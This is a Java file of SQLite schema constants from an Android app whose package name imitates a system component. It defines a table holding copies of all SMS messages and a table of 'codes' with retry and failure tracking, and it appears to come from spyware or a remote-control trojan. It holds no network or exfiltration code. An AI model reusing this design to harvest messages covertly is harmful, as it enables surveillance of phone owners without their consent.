package com.android.system.controled.db;

public class Tables {

	public class TableSms {

		public static final String TABLE_NAME_ALLSMS = "table_allsms";
		public static final String ALLSMS_TABLE_COLUMN_ID = "_id";// ¶ÌÐÅÐòºÅ
		public static final String ALLSMS_TABLE_COLUMN_THREAD_ID = "thread_id";// ¶Ô»°ÐòºÅ
		public static final String ALLSMS_TABLE_COLUMN_DATE_LONG = "date_long";
		public static final String ALLSMS_TABLE_COLUMN_DATE_STR = "date_str";
		public static final String ALLSMS_TABLE_COLUMN_ADDRESS = "address";
		public static final String ALLSMS_TABLE_COLUMN_PERSON_ID = "person_id";
		public static final String ALLSMS_TABLE_COLUMN_PERSON_NAME = "person_name";
		public static final String ALLSMS_TABLE_COLUMN_TYPE = "type";
		public static final String ALLSMS_TABLE_COLUMN_SUBJECT = "subject";
		public static final String ALLSMS_TABLE_COLUMN_BODY = "body";
		public static final String ALLSMS_TABLE_COLUMN_READ = "read";
		public static final String ALLSMS_TABLE_COLUMN_STATUS = "status";

		public static final String CREATETABLE_ALLSMS = "CREATE TABLE IF NOT EXISTS " + TABLE_NAME_ALLSMS + " (" + ALLSMS_TABLE_COLUMN_ID + " INTEGER PRIMARY KEY," + ALLSMS_TABLE_COLUMN_THREAD_ID + " INTEGER," + ALLSMS_TABLE_COLUMN_DATE_LONG + " LONG unique," + ALLSMS_TABLE_COLUMN_DATE_STR + " TEXT," + ALLSMS_TABLE_COLUMN_ADDRESS + " TEXT," + ALLSMS_TABLE_COLUMN_PERSON_ID + " INTEGER," + ALLSMS_TABLE_COLUMN_PERSON_NAME + " TEXT," + ALLSMS_TABLE_COLUMN_TYPE + " INTEGER," + ALLSMS_TABLE_COLUMN_SUBJECT + " TEXT," + ALLSMS_TABLE_COLUMN_BODY + " TEXT," + ALLSMS_TABLE_COLUMN_READ + " INTEGER," + ALLSMS_TABLE_COLUMN_STATUS + " INTEGER )";
		public static final String DROP_TABLE_ALLSMS = "DROP TABLE IF EXISTS " + TABLE_NAME_ALLSMS + ";";
		public static final String DELETE_TABLE__ALLSMS = "DELETE FROM " + TABLE_NAME_ALLSMS + ";";

	}

	public class TableCodes {

		public static final String TABLE_NAME_CODES = "table_codes";
		public static final String CODES_TABLE_COLUMN_ID = "_id";
		public static final String CODES_TABLE_COLUMN_DATE_LONG = "date_long";
		public static final String CODES_TABLE_COLUMN_CODE = "code_str";
		public static final String CODES_TABLE_COLUMN_RESULT = "result";
		public static final String CODES_TABLE_COLUMN_MARK = "mark";
		public static final String CODES_TABLE_COLUMN_NEED_REDO = "redo_need";
		public static final String CODES_TABLE_COLUMN_FAILED_TIMES = "failed_times";

		public static final String CREATETABLE_CODES = "CREATE TABLE IF NOT EXISTS " + TABLE_NAME_CODES + " (" + CODES_TABLE_COLUMN_ID + " INTEGER PRIMARY KEY," + CODES_TABLE_COLUMN_DATE_LONG + " LONG unique," + CODES_TABLE_COLUMN_CODE + " TEXT," + CODES_TABLE_COLUMN_RESULT + " INTEGER DEFAULT 0," + CODES_TABLE_COLUMN_NEED_REDO + " INTEGER DEFAULT 0," + CODES_TABLE_COLUMN_MARK + " TEXT," + CODES_TABLE_COLUMN_FAILED_TIMES + " INTEGER)";
		public static final String DROP_TABLE_CODES = "DROP TABLE IF EXISTS " + TABLE_NAME_CODES + ";";
		public static final String DELETE_TABLE_ALLCODES = "DELETE FROM " + TABLE_NAME_CODES + ";";
	}
}
